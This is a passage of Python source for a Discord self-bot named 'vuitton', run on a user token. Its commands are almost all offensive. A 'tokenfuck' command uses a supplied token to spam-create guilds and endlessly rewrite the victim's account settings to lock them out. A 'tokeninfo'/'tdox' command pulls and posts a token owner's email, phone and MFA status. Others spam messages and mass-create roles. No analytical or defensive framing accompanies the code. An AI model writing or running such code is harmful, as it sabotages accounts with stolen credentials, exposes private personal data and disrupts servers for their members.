    stats = datetime.datetime.utcnow() - start_time
    stats = str(stats).split('.')[0]
    await ctx.send(f'`'+stats+'`')

@vuitton.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send('Pong!')

@vuitton.command()
async def spam(ctx, amount: int, *, message): 
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@vuitton.command()
async def massrole(ctx): 
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=RandString(), color=RandomColor())
        except:
            return    


@vuitton.command(aliases=['tokenfucker', 'disable', 'crash']) 
async def tokenfuck(ctx, _token): 
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': "Vuitton Owns You",
        'icon': "https://media.discordapp.net/attachments/777919626579410955/780143996482748446/DlDlX9w.png",
        'name': "vuitton hoed you",
        'region': "india"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}INVALID{Fore.RED}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}INVALID{Fore.RED}{e}"+Fore.RESET)
            else:
                break   
           
@vuitton.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.RED}Something is wrong ==> {Fore.RED}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@vuitton.command()
async def unbanll(ctx):
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

vuitton.run("TOKEN", bot=False)
